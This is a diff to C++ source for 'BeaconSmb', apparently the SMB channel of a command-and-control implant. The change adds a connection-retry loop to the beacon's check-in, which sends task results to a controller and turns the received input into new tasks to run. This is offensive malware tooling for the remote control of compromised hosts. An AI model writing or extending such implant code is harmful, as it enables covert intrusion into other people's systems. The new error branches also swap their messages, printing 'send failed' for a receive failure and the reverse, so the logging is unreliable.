@@ -20,25 +20,36 @@ BeaconSmb::~BeaconSmb()
 
 void BeaconSmb::checkIn()
 {
+	DEBUG("initConnection");
+	while(!m_clientSmb->initConnection())
+	{
+		Sleep(333);
+		DEBUG("initConnection");
+	}
+
 	std::string output;
 	taskResultsToCmd(output);
 
 	DEBUG("sending output.size " << std::to_string(output.size()));
 
-	m_clientSmb->sendData(output);
-
-	DEBUG("sent");
-
-	DEBUG("receiving");
-
-	string input;
-	m_clientSmb->receiveData(input);
-
-	DEBUG("received input.size " << std::to_string(input.size()));
-
-	if(!input.empty())
+	bool res = m_clientSmb->sendData(output);
+	if(res)
 	{
-		cmdToTasks(input);
+		string input;
+		res=m_clientSmb->receiveData(input);
+		if(res)
+		{
+			DEBUG("received input.size " << std::to_string(input.size()));
+
+			if(!input.empty())
+			{
+				cmdToTasks(input);
+			}
+		}
+		else
+			DEBUG("send failed");
 	}
+	else
+		DEBUG("Receive failed");
 }
 
